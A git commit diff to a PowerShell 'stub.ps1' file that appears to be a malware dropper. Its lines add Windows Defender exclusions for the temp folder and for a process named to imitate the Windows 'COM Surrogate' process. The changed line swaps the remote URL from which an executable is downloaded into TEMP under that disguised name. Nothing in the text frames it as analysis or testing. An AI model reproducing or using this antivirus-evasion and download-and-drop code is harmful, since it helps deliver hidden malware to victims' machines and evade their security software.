b150b499835702605664e245b62acc58e3b2803a
chickennuggets <118553163+M7mmdddd@users.noreply.github.com>
2025-03-05 14:50:30 -0800

    Update stub.ps1

--- stub.ps1
+++ stub.ps1
@@ -3,7 +3,7 @@ Add-MpPreference -ExclusionPath "$env:temp"
 Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp\COM_Surrogate.exe"
 Add-MpPreference -ExclusionPath $env:TEMP\COM_Surrogate.exe
 Add-MpPreference -ExclusionProcess "COM_Surrogate.exe"
-$url = "https://raw.githubusercontent.com/M7mmdddd/webstie-demo/refs/heads/main/files/COM%20Surrogate.exe"
+$url = "https://raw.githubusercontent.com/M7mmdddd/psps/refs/heads/main/cia-screenshar.exe"
 
  $output = "$env:TEMP\COM_Surrogate.exe"
 
